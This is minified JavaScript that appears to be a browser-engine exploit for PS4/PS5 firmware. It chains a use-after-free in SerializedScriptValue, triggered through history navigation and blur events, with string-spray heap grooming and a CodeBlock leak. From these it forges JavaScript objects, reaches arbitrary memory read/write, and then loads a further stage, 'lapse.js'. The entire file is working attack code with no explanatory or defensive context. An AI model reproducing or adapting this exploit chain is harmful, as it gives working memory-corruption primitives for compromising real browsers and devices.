import{Int as e}from"./module/int64.js";import{Memory as t}from"./module/mem.js";import{KB as r,MB as a}from"./module/offset.js";import{BufferView as s}from"./module/rw.js";import{die as i,DieError as n,log as l,clear_log as o,sleep as $,hex as d,align as f}from"./module/utils.js";import*as u from"./config.js";import*as w from"./module/offset.js";let[is_ps4,version]=(()=>{let e=u.target,t=(65536&e)==0,r=65535&e,[a,s]=t?[1536,4096]:[256,1536];if(!(a<=r&&r<s))throw RangeError(`invalid config.target: ${d(e)}`);return[t,r]})(),ssv_len=(()=>{if(!is_ps4)return 80;if(1536<=version&&version<1616)return 88;if(1616<=version&&version<2304)return 72;if(2304<=version)return 80;throw RangeError(`unsupported console/firmware: ps${is_ps4?"4":"5"}, version: ${d(version)}`)})(),num_fsets=384,num_spaces=64,num_adjs=8,num_reuses=768,num_strs=512,num_leaks=256,rows=",".repeat(ssv_len/8-2),original_strlen=ssv_len-w.size_strimpl,original_loc=location.pathname;function gc(){new Uint8Array(4*a)}function getRandomInt(e,t){let r=Math.ceil(e);return Math.floor(Math.random()*(Math.floor(t)-r)+r)}function sread64(t,r){let a=t.charCodeAt(r)|t.charCodeAt(r+1)<<8|t.charCodeAt(r+2)<<16|t.charCodeAt(r+3)<<24,s=t.charCodeAt(r+4)|t.charCodeAt(r+5)<<8|t.charCodeAt(r+6)<<16|t.charCodeAt(r+7)<<24;return new e(a,s)}function prepare_uaf(){let e=[],t=[];function r(e,t){for(let r=0;r<t/2;r++){let a=document.createElement("frameset");a.rows=rows,a.cols=rows,e.push(a)}}return history.replaceState("state0",""),r(e,384),history.pushState("state1","",original_loc+"#bar"),t.push(e.length),r(e,64),history.pushState("state1","",original_loc+"#foo"),t.push(e.length),r(e,64),history.pushState("state2",""),[e,t]}async function uaf_ssv(e,t,r){let a=[],o=document.createElement("input");o.id="input";let $=document.createElement("input");$.id="foo";let f=document.createElement("a");f.id="bar",l(`ssv_len: ${d(ssv_len)}`);let u=null,w=null,m=null,c=[0,0],p=[];function v(e){let t=null===u,r=t?0:1;if(l(`pop ${r} came`),0===c[r]){let a=p[r][1];a(new n(`blurs before pop ${r} came: ${c[r]}`))}t&&(m=new Promise((e,t)=>{p.push([e,t]),addEventListener("popstate",v,{once:!0}),history.back()})),t?u=e:w=e,p[r][0]()}let x=new Promise((e,t)=>{p.push([e,t]),addEventListener("popstate",v,{once:!0})});function _(s){let n=s.target,$=n===o,d=$?0:1;l(`${n.id} blur came`),c[d]>0&&i(`${name}: multiple blurs. blurs: ${c[d]}`),history.replaceState("state3","",original_loc);let f=$?t:r;for(let u=f-4;u<f+4;u++)e[u].rows="",e[u].cols="";for(let w=0;w<768;w++){let m=new Uint8Array(new ArrayBuffer(ssv_len));m[0]=65,a.push(m)}c[d]++}o.addEventListener("blur",_),$.addEventListener("blur",_),document.body.append(o),document.body.append($),document.body.append(f),l(`readyState now: ${document.readyState}`),"complete"!==document.readyState&&await new Promise(e=>{document.addEventListener("readystatechange",function t(){"complete"===document.readyState&&(document.removeEventListener("readystatechange",t),e())})}),l(`readyState now: ${document.readyState}`),await new Promise(e=>{o.addEventListener("focus",e,{once:!0}),o.focus()}),history.back(),await x,await m,l("done await popstate"),o.remove(),$.remove(),f.remove();let h=[];for(let b=0;b<a.length;b++){let g=a[b];if(65!==g[0]){if(l(`view index: ${d(b)}`),l("found view:"),l(g),g[0]=1,g.fill(0,1),h.length){h[1]=[new s(g.buffer),w];break}h[0]=new s(g.buffer),b=767}}return 2!==h.length&&i("failed SerializedScriptValue UAF"),h}class Reader{constructor(e,t){this.rstr=e,this.rstr_view=t,this.m_data=t.read64(w.strimpl_m_data)}read8_at(e){return this.rstr.charCodeAt(e)}read32_at(e){let t=this.rstr;return(t.charCodeAt(e)|t.charCodeAt(e+1)<<8|t.charCodeAt(e+2)<<16|t.charCodeAt(e+3)<<24)>>>0}read64_at(e){return sread64(this.rstr,e)}read64(e){return this.rstr_view.write64(w.strimpl_m_data,e),sread64(this.rstr,0)}set_addr(e){this.rstr_view.write64(w.strimpl_m_data,e)}restore(){this.rstr_view.write64(w.strimpl_m_data,this.m_data),this.rstr_view.write32(w.strimpl_strlen,original_strlen)}}async function make_rdr(e){let t=0,r=[],a=new Uint32Array(1),s=new Uint8Array(a.buffer),n=original_strlen-4,o="B".repeat(n);for(l("start string spray");;){for(let f=0;f<512;f++){a[0]=f;let u=[o,String.fromCodePoint(...s)].join("");r.push(u)}if(1111638594===e.read32(w.strimpl_inline_str)){e.write32(w.strimpl_strlen,4294967295);break}r.length=0,gc(),await $(),t++}l(`JSString reused memory at loop: ${t}`);let m=e.read32(w.strimpl_inline_str+n);l(`str index: ${d(m)}`),l("view:"),l(e);let c=Error(r[m]).message;if(l(`str len: ${d(c.length)}`),4294967295===c.length){l("confirmed correct leaked");let p=e.read64(w.strimpl_m_data).sub(w.strimpl_inline_str);return l(`view's buffer address: ${p}`),new Reader(c,e)}i("JSString wasn't modified")}let cons_len=ssv_len-40,bt_offset=0,idx_offset=ssv_len-24,strs_offset=ssv_len-16,src_part=(()=>{let e="var f = 0x11223344;\n";for(let t=0;t<cons_len;t+=8)e+=`var a${t} = ${256+t};
`;return e})();async function leak_code_block(e,t){let s=e,i=[];for(let n=0;n<t-16;n+=8)i.push(n);let o=ssv_len,u=`var bt = [${i}];
return bt;
`,m=u+src_part,c=[];for(let p=0;p<256;p++)c.push(m+`var idx = ${p};
idx\`foo\`;`);let v=is_ps4&&version<2304?128*r:1*a,x=4*r,_=f(s.m_data,v);l(`search addr: ${_}`),l(`func_src:
${c[0]}
func_src end`),l("start find CodeBlock");let h=null,b=null,g=null,y=0,k=0;s.set_addr(_);loop:for(;;){let S=[];for(let j=0;j<256;j++){let A=Function(c[j]);A(),S.push(A)}for(let C=0;C<v;C+=x)for(let E=C;E<C+x;E+=o){if(287454020!==s.read32_at(E+8))continue;s.set_addr(s.read64_at(E+strs_offset));let z=s.read8_at(5);if(0!==z){s.set_addr(_),h=E,g=S[b=s.read32_at(E+idx_offset)];break loop}s.set_addr(_),k++}y++,gc(),await $()}l(`loop ${y} winning_off: ${d(h)}`),l(`winning_idx: ${d(b)} false positives: ${k}`),l("CodeBlock.m_constantRegisters.m_buffer:"),s.set_addr(_.add(h));for(let B=0;B<o;B+=8)l(`${s.read64_at(B)} | ${d(B)}`);let L=s.read64_at(0),R=s.read64_at(strs_offset);l(`immutable butterfly addr: ${L}`),l(`string array passed to tag addr: ${R}`),l("JSImmutableButterfly:"),s.set_addr(L);for(let G=0;G<t;G+=8)l(`${s.read64_at(G)} | ${d(G)}`);l("string array:"),s.set_addr(R);for(let I=0;I<w.size_jsobj;I+=8)l(`${s.read64_at(I)} | ${d(I)}`);return[g,L,R]}function make_ssv_data(e,t,r,a,s){let i=is_ps4?version>=2304?24:32:version>=768?24:32,n=16+i;e.write64(8,r.add(n)),e.write32(16,9),e.write64(20,9),t.write32(n,6),t[n+4]=23,t.write32(n+5,0),e.write64(24,r.add(0)),t.write64(0,r.add(16)),t.write32(8,1),t.write32(12,1),32===i?(t.write64(32,a),t.write32(40,s)):(t.write64(16,a),t.write32(36,s))}async function make_arw(r,a,n){let o=r,$=32+w.size_jsobj,f=$+8+8;l("STAGE: leak CodeBlock");let u=16+f+24,[m,c,p]=await leak_code_block(o,u),v=o.rstr_view,x=o.m_data.sub(w.strimpl_inline_str),_=new Uint8Array(v);v.fill(0),make_ssv_data(a,v,x,c,u);let h=new s(n.state);v.set(_),l("ArrayBuffer pointing to JSImmutableButterfly:");for(let b=0;b<h.byteLength;b+=8)l(`${h.read64(b)} | ${d(b)}`);let g=o.read64(p);h.write64(32,g),h.write64(32+w.js_butterfly,c.add(f)),h.write64(f-16,7),h.write32(f-8,1),h.write32(f-8+4,1),h.write64(f,0),h.write32(f+8,0),h.write32(f+12,1),h.write64(f+16,7),h.write64(16,c.add(32));let y=m()[0];function k(e){return y[0]=e,h.read64(f+16)}l(`fake.raw: ${y.raw}`),l(`fake[0]: ${y[0]}`),l(`fake: [${y}]`),l("test setting fake[0] to 3"),y[0]=3,3!==y[0]&&i(`unexpected fake[0]: ${y[0]}`);let S=new DataView(new ArrayBuffer(1)),j=new Uint32Array(new ArrayBuffer(w.size_view)),A={addr:null,0:0},C=k(S),E=k(j),z=k(A),B=w.size_view/4,L=new Uint32Array(B),R=k(L),G=o.read64(R.add(w.view_m_vector)),I=w.view_m_vector/4,J=w.view_m_length/4,T=w.view_m_mode/4,F=w.js_butterfly/4;L[I]=C.lo,L[I+1]=C.hi,L[J]=B,o.set_addr(E),L[T]=o.read32_at(w.view_m_mode),L[0]=o.read32_at(0),L[1]=o.read32_at(4),L[F]=o.read32_at(w.js_butterfly),L[F+1]=o.read32_at(w.js_butterfly+4),h.write64(f+16,G);let U=y[0];l("main (pointing to worker):");for(let V=0;V<w.size_view;V+=8){let P=V/4;l(`${new e(U[P],U[P+1])} | ${d(V)}`)}new t(U,S,A,z.add(w.js_inline_prop),o.read64(z.add(w.js_butterfly))),l("achieved arbitrary r/w"),o.restore(),v.write32(0,-1),a.write32(0,-1),make_arw._buffer=h.buffer}async function main(){l("STAGE: UAF SSV");let[e,t]=prepare_uaf(),[r,[a,s]]=await uaf_ssv(e,t[1],t[0]);l("STAGE: get string relative read primitive");let i=await make_rdr(r);for(let n of e)n.rows="",n.cols="";l("STAGE: achieve arbitrary read/write primitive"),await make_arw(i,a,s),o(),import("./lapse.js")}StartTimer(),setTimeout(main,getRandomInt(500,3e3));